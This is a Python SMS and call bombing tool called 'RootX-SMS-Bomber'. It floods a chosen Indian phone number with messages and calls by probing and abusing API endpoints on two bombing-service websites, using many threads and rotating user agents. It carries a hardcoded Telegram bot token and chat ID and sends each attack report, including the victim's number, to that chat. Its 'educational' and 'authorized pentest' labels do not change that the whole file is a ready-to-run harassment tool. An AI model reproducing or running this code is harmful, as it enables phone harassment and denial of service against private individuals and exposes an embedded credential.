#!/usr/bin/env python3
# ================================================================
# RootX-SMS-Bomber.py
# Educational SMS Bomber - Multi-Platform
# Target: callbomberz.in & khojotech.in
# Authorized Pentest Use Only
# ================================================================

import requests
import time
import threading
import random
import sys
import json
import re
from urllib.parse import urlparse

# ──── CONFIG ────
BOT_TOKEN = "8990555847:AAEsiUo2p0voMjiFsoZsH6Ht9wqJ33zKmr0"
CHAT_ID = "8263124140"

# ──── USER AGENTS ────
UA_LIST = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1"
]

# ──── TELEGRAM HELPER ────
def tg_send(text):
    """Send message to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
        payload = {
            "chat_id": CHAT_ID,
            "text": text[:4000],
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }
        requests.post(url, json=payload, timeout=5)
    except:
        pass

def tg_photo(photo_url, caption=""):
    """Send photo to Telegram"""
    try:
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
        payload = {
            "chat_id": CHAT_ID,
            "photo": photo_url,
            "caption": caption[:1000]
        }
        requests.post(url, json=payload, timeout=5)
    except:
        pass

# ──── CALLBOMBERZ.IN PROVIDER ────
class CallBomberzProvider:
    """Provider for callbomberz.in - SMS & Call bombing"""
    
    BASE_URL = "https://www.callbomberz.in"
    
    def __init__(self, phone):
        self.phone = phone
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(UA_LIST),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
            "Origin": self.BASE_URL,
            "Referer": f"{self.BASE_URL}/sms-bomber",
        })
        self.api_endpoints = []
        self.attack_count = 0
    
    def discover_endpoints(self):
        """Discover API endpoints by scraping page"""
        endpoints = []
        
        # Try common Next.js API routes
        api_paths = [
            "/api/send",
            "/api/sms",
            "/api/sms/send",
            "/api/bomb",
            "/api/launch",
            "/api/attack",
            "/api/send-sms",
            "/api/v1/sms",
            "/api/v1/send",
            "/api/v1/bomb",
            "/api/sms-bomber",
            "/api/start",
        ]
        
        for path in api_paths:
            url = f"{self.BASE_URL}{path}"
            try:
                r = self.session.post(url, 
                    json={"phone": self.phone, "number": self.phone},
                    timeout=3,
                    allow_redirects=False
                )
                if r.status_code not in [404, 405, 500]:
                    endpoints.append(url)
                    print(f"  [✓] Found endpoint: {url} -> {r.status_code}")
                else:
                    print(f"  [✗] {url} -> {r.status_code}")
            except:
                pass
        
        # Try GET endpoints too
        for path in api_paths:
            url = f"{self.BASE_URL}{path}"
            try:
                r = self.session.get(url, 
                    params={"phone": self.phone, "number": self.phone},
                    timeout=3,
                    allow_redirects=False
                )
                if r.status_code not in [404, 405, 500]:
                    endpoints.append(url)
                    print(f"  [✓] GET endpoint: {url} -> {r.status_code}")
            except:
                pass
        
        self.api_endpoints = endpoints
        return endpoints
    
    def send_sms(self, endpoint, count=1):
        """Send SMS via discovered endpoint"""
        success = 0
        for _ in range(count):
            try:
                payloads = [
                    {"phone": self.phone, "number": self.phone},
                    {"mobile": self.phone, "phoneNumber": self.phone},
                    {"to": self.phone, "recipient": self.phone},
                    {"phone": self.phone, "count": "1", "type": "sms"},
                    {"target": self.phone, "number": self.phone, "method": "sms"},
                ]
                
                for payload in payloads:
                    try:
                        r = self.session.post(endpoint, json=payload, timeout=5)
                        if r.status_code == 200:
                            success += 1
                            self.attack_count += 1
                        break
                    except:
                        continue
                        
            except Exception as e:
                pass
            time.sleep(0.5)
        return success
    
    def call_bomb(self, endpoint, count=1):
        """Send calls via discovered endpoint"""
        success = 0
        for _ in range(count):
            try:
                payloads = [
                    {"phone": self.phone, "type": "call"},
                    {"mobile": self.phone, "method": "call"},
                    {"target": self.phone, "service": "voice"},
                    {"phoneNumber": self.phone, "callType": "voice"},
                ]
                
                for payload in payloads:
                    try:
                        r = self.session.post(endpoint, json=payload, timeout=5)
                        if r.status_code == 200:
                            success += 1
                            self.attack_count += 1
                        break
                    except:
                        continue
            except:
                pass
            time.sleep(0.5)
        return success
    
    def report(self):
        """Send attack report to Telegram"""
        msg = (
            f"<b>🔥 RootX - CallBomberz.in Report</b>\n"
            f"Phone: <code>{self.phone}</code>\n"
            f"Endpoints Found: {len(self.api_endpoints)}\n"
            f"Attacks Sent: {self.attack_count}\n"
            f"Status: Active"
        )
        tg_send(msg)


# ──── KHOJOTECH.IN PROVIDER ────
class KhojotechProvider:
    """Provider for khojotech.in - SMS & Call bombing"""
    
    BASE_URL = "https://khojotech.in"
    
    def __init__(self, phone):
        self.phone = phone
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": random.choice(UA_LIST),
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-US,en;q=0.9,hi;q=0.8",
            "Origin": self.BASE_URL,
            "Referer": f"{self.BASE_URL}/smsbomber",
        })
        self.api_endpoints = []
        self.attack_count = 0
    
    def discover_endpoints(self):
        """Discover API endpoints"""
        endpoints = []
        
        api_paths = [
            "/api/send",
            "/api/sms",
            "/api/sms/send",
            "/api/bomb",
            "/api/smsbomber",
            "/api/launch",
            "/api/attack",
            "/api/v1/sms",
            "/api/v1/send",
            "/api/v1/bomb",
            "/api/call",
            "/api/call/send",
            "/api/voice",
            "/api/callbomber",
        ]
        
        for path in api_paths:
            url = f"{self.BASE_URL}{path}"
            try:
                r = self.session.post(url, 
                    json={"phone": self.phone, "number": self.phone},
                    timeout=3,
                    allow_redirects=False
                )
                if r.status_code not in [404, 405, 500]:
                    endpoints.append(url)
                    print(f"  [✓] Found endpoint: {url} -> {r.status_code}")
            except:
                pass
        
        self.api_endpoints = endpoints
        return endpoints
    
    def send_sms(self, endpoint, count=1):
        """Send SMS via discovered endpoint"""
        success = 0
        for _ in range(count):
            try:
                payloads = [
                    {"phone": self.phone, "number": self.phone},
                    {"mobile": self.phone, "phoneNumber": self.phone},
                    {"to": self.phone, "message": "Hello"},
                    {"target": self.phone, "type": "sms"},
                ]
                
                for payload in payloads:
                    try:
                        r = self.session.post(endpoint, json=payload, timeout=5)
                        if r.status_code == 200:
                            success += 1
                            self.attack_count += 1
                        break
                    except:
                        continue
            except:
                pass
            time.sleep(0.3)
        return success
    
    def call_bomb(self, endpoint, count=1):
        """Send calls via discovered endpoint"""
        success = 0
        for _ in range(count):
            try:
                payloads = [
                    {"phone": self.phone, "type": "call"},
                    {"mobile": self.phone, "method": "voice"},
                    {"target": self.phone, "service": "call"},
                ]
                
                for payload in payloads:
                    try:
                        r = self.session.post(endpoint, json=payload, timeout=5)
                        if r.status_code == 200:
                            success += 1
                            self.attack_count += 1
                        break
                    except:
                        continue
            except:
                pass
            time.sleep(0.5)
        return success


# ──── MAIN BOMBER ENGINE ────
class RootXBomber:
    """Main RootX SMS Bomber Engine"""
    
    def __init__(self, phone, sms_count=50, call_count=10):
        self.phone = phone
        self.sms_count = sms_count
        self.call_count = call_count
        self.providers = []
        self.total_sent = 0
        self.lock = threading.Lock()
    
    def banner(self):
        """Show banner"""
        print("""
╔══════════════════════════════════════╗
║    🔥 RootX-SMS-Bomber v1.0 🔥      ║
║  Multi-Platform Attack Engine        ║
║  Target: callbomberz.in + khojotech ║
╚══════════════════════════════════════╝
        """)
        print(f"[*] Target Phone: +91{self.phone}")
        print(f"[*] SMS Burst: {self.sms_count}")
        print(f"[*] Call Burst: {self.call_count}")
        print(f"[*] Telegram Report: Enabled\n")
    
    def worker_sms(self, provider, endpoint, count):
        """Thread worker for SMS"""
        sent = provider.send_sms(endpoint, count)
        with self.lock:
            self.total_sent += sent
    
    def worker_call(self, provider, endpoint, count):
        """Thread worker for calls"""
        sent = provider.call_bomb(endpoint, count)
        with self.lock:
            self.total_sent += sent
    
    def run(self):
        """Main execution"""
        self.banner()
        
        # Initialize providers
        cb = CallBomberzProvider(self.phone)
        kj = KhojotechProvider(self.phone)
        self.providers = [cb, kj]
        
        # Discover endpoints
        print("[*] Discovering API endpoints on callbomberz.in...")
        cb_endpoints = cb.discover_endpoints()
        
        print("\n[*] Discovering API endpoints on khojotech.in...")
        kj_endpoints = kj.discover_endpoints()
        
        all_sms_endpoints = cb_endpoints + kj_endpoints
        all_call_endpoints = cb_endpoints + kj_endpoints
        
        if not all_sms_endpoints:
            print("\n[!] No API endpoints auto-discovered.")
            print("[!] Websites may use dynamic routes or WAF protection.")
            print("[*] Trying manual endpoint patterns...\n")
            
            # Manual endpoints if discovery fails
            manual_endpoints = [
                "https://www.callbomberz.in/api/send",
                "https://www.callbomberz.in/api/sms",
                "https://www.callbomberz.in/api/launch",
                "https://khojotech.in/api/send",
                "https://khojotech.in/api/sms",
                "https://khojotech.in/api/launch",
            ]
            all_sms_endpoints = manual_endpoints
            all_call_endpoints = manual_endpoints
        
        # Start SMS attack threads
        print(f"\n[+] Launching SMS attack: {self.sms_count} messages per endpoint...")
        threads = []
        
        sms_per_endpoint = max(1, self.sms_count // len(all_sms_endpoints)) if all_sms_endpoints else self.sms_count
        
        for provider in self.providers:
            for endpoint in (all_sms_endpoints if provider.BASE_URL in str(all_sms_endpoints) or any(provider.BASE_URL in str(e) for e in all_sms_endpoints) else []):
                pass
            
        # Assign endpoints to providers
        for endpoint in all_sms_endpoints:
            if "callbomberz" in endpoint:
                t = threading.Thread(target=self.worker_sms, args=(cb, endpoint, sms_per_endpoint))
                threads.append(t)
            elif "khojotech" in endpoint:
                t = threading.Thread(target=self.worker_sms, args=(kj, endpoint, sms_per_endpoint))
                threads.append(t)
        
        # If no specific endpoints found, try both providers on all
        if not threads:
            for endpoint in all_sms_endpoints[:3]:
                t = threading.Thread(target=self.worker_sms, args=(cb, endpoint, sms_per_endpoint))
                threads.append(t)
                t = threading.Thread(target=self.worker_sms, args=(kj, endpoint, sms_per_endpoint))
                threads.append(t)
        
        for t in threads:
            t.start()
            
        for t in threads:
            t.join()
        
        # Start call attack threads
        print(f"\n[+] Launching Call attack: {self.call_count} calls per endpoint...")
        call_threads = []
        
        call_per_endpoint = max(1, self.call_count // len(all_call_endpoints)) if all_call_endpoints else self.call_count
        
        for endpoint in all_call_endpoints:
            if "callbomberz" in endpoint:
                t = threading.Thread(target=self.worker_call, args=(cb, endpoint, call_per_endpoint))
                call_threads.append(t)
            elif "khojotech" in endpoint:
                t = threading.Thread(target=self.worker_call, args=(kj, endpoint, call_per_endpoint))
                call_threads.append(t)
        
        if not call_threads:
            for endpoint in all_call_endpoints[:3]:
                t = threading.Thread(target=self.worker_call, args=(cb, endpoint, call_per_endpoint))
                call_threads.append(t)
                t = threading.Thread(target=self.worker_call, args=(kj, endpoint, call_per_endpoint))
                call_threads.append(t)
        
        for t in call_threads:
            t.start()
            
        for t in call_threads:
            t.join()
        
        # Send report to Telegram
        print(f"\n[✓] Attack Complete!")
        print(f"[*] Total Payloads Sent: {self.total_sent}")
        
        report_msg = (
            f"<b>🔥 RootX-SMS-Bomber - Attack Report</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<b>Target:</b> <code>+91{self.phone}</code>\n"
            f"<b>SMS Sent:</b> {self.sms_count}\n"
            f"<b>Calls Sent:</b> {self.call_count}\n"
            f"<b>Total Delivered:</b> {self.total_sent}\n"
            f"<b>Providers:</b> callbomberz.in, khojotech.in\n"
            f"<b>Status:</b> ✅ Completed\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"<i>Authorized Pentest • Educational Purpose</i>"
        )
        tg_send(report_msg)
        print("[*] Report sent to Telegram ✅")


# ──── ENTRY POINT ────
def main():
    """Main entry point"""
    import os
    
    # Clear terminal
    os.system('cls' if os.name == 'nt' else 'clear')
    
    # Header
    print("╔══════════════════════════════════════════╗")
    print("║       🔥 RootX-SMS-Bomber v1.0 🔥        ║")
    print("║    Multi-Platform SMS/Call Attack        ║")
    print("║    callbomberz.in + khojotech.in         ║")
    print("║    [✓] Telegram Report Enabled           ║")
    print("╚══════════════════════════════════════════╝")
    print()
    
    # Get phone number
    phone = input("[?] Enter 10-digit phone number (without +91): ").strip()
    
    # Validate
    if not phone.isdigit() or len(phone) != 10:
        print("[!] Invalid number! Must be 10 digits.")
        sys.exit(1)
    
    # Get SMS count
    try:
        sms_count = int(input("[?] SMS count per provider (default 50): ").strip() or "50")
    except:
        sms_count = 50
    
    # Get Call count
    try:
        call_count = int(input("[?] Call count per provider (default 10): ").strip() or "10")
    except:
        call_count = 10
    
    print(f"\n[!] Authorized Pentest Mode")
    print(f"[!] Targeting: +91{phone}")
    print(f"[!] SMS: {sms_count} | Calls: {call_count}")
    print()
    
    confirm = input("[?] Start attack? (y/N): ").strip().lower()
    if confirm != 'y':
        print("[*] Aborted.")
        sys.exit(0)
    
    # Run bomber
    bomber = RootXBomber(phone, sms_count, call_count)
    bomber.run()


if __name__ == "__main__":
    main()